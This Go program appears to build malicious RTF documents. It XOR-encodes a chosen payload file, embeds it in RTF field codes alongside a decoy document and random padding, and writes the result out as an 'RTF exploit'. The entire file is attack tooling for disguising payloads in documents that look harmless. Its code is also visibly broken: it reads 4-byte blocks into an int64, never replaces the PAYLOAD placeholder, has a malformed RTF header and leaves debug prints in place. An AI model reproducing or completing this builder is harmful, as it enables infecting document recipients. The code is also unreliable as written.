package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
)

const (
	rtfTemplate = `\rtf1\ansi{\fonttbl{\f0\fnil\fcharset0 Arial;}}{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\lang1033\f0\fs24\par
{\field{\*\fldinst{\*\fldinst{ PAYLOAD_START }}}{\fldrslt{PAYLOAD}}}\par
{\field{\*\fldinst{\*\fldinst{ DECOY_DOC_START }}}{\fldrslt{DECOY_DOC}}}\par
{\field{\*\fldinst{\*\fldinst{ DECOY_DOC_END }}}{\fldrslt{RANDOM_BYTES}}}\par
`
	payloadStartTag   = "PAYLOAD_START"
	decoyDocStartTag  = "DECOY_DOC_START"
	decoyDocEndTag    = "DECOY_DOC_END"
	randomBytesLength = 1024
)

func toHex(n int) string {
	return fmt.Sprintf("%02X", n)
}

func toHex8(n int) string {
	return fmt.Sprintf("%08X", n)
}

func generateRandomBytes(n int) []byte {
	randBytes := make([]byte, n)
	for i := range randBytes {
		randBytes[i] = byte(rand.Intn(256))
	}
	return randBytes
}

func writeFile(filename string, data []byte) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = file.Write(data)
	return err
}

func getChar(x string) string {
	var chars strings.Builder
	for i := 0; i < len(x); i += 2 {
		b, err := strconv.ParseInt(x[i:i+2], 16, 8)
		if err != nil {
			fmt.Println(err)
			return ""
		}
		chars.WriteByte(byte(b))
	}
	return chars.String()
}

func encryptFile(filePath string, key int) ([]byte, error) {
	// Open the file for reading
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	fmt.Println(111)
	// Check if the file is empty or larger than 1mb
	fi, err := file.Stat()
	if err != nil {
		return nil, err
	}
	if fi.Size() == 0 {
		return nil, fmt.Errorf("Error: File is empty.")
	}
	if fi.Size() > 0x100000 {
		return nil, fmt.Errorf("Error: File size should be less than 1mb.")
	}

	// Read the entire contents of the file into a slice of bytes
	input, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}

	// Pad the input slice with 0s if its length is not a multiple of 4
	for len(input)%4 != 0 {
		input = append(input, 0)
	}

	// Initialize an empty slice of bytes to store the encrypted data
	encryptedFile := make([]byte, len(input))

	// Iterate over the input slice in 4-byte blocks, encrypting each block
	for i := 0; i < len(input); i += 4 {
		// Read the 4-byte block as an integer
		var dword int64
		err := binary.Read(bytes.NewReader(input[i:i+4]), binary.LittleEndian, &dword)
		if err != nil {
			return nil, fmt.Errorf("Error reading 4-byte block at index %d: %v", i, err)
		}

		// Ensure that dword is a 32-bit integer
		dword &= 0xFFFFFFFF
		if dword == 0 {
			encryptedFile = append(encryptedFile, []byte(toHex8(0))...)
		} else {
			encryptedFile = append(encryptedFile, []byte(toHex8(int(dword)^key))...)
		}
	}

	// Return the encrypted data
	return encryptedFile, nil
}

func makeExploit(docTemplate, payload, decoyDoc string) ([]byte, error) {
	fmt.Println(1)
	exploitData := []byte(strings.ReplaceAll(docTemplate, payloadStartTag, payload))
	exploitData = []byte(strings.ReplaceAll(string(exploitData), decoyDocStartTag, decoyDoc))
	exploitData = []byte(strings.ReplaceAll(string(exploitData), decoyDocEndTag, string(generateRandomBytes(randomBytesLength))))
	return exploitData, nil
}
func main() {
	fmt.Println("Enter the path of the file to be encrypted:")
	var filePath string
	fmt.Scanln(&filePath)

	key := rand.Intn(0x100000000)
	fmt.Println(1)

	encryptedFile, err := encryptFile(filePath, key)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	fmt.Println(11)

	fmt.Println("Enter the path of the decoy document:")
	var decoyDocPath string
	fmt.Scanln(&decoyDocPath)
	//decoyDocPath := "lel.doc"

	decoyDoc, err := ioutil.ReadFile(decoyDocPath)
	if err != nil {
		fmt.Println(err)
		return
	}

	exploitData, err := makeExploit(rtfTemplate, string(encryptedFile), string(decoyDoc))
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(2)

	fmt.Println("Enter the path of the output file:")
	var outputPath string
	fmt.Scanln(&outputPath)
	//outputPath := "lelo.doc"
	err = writeFile(outputPath, exploitData)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Successfully created RTF exploit!")
}
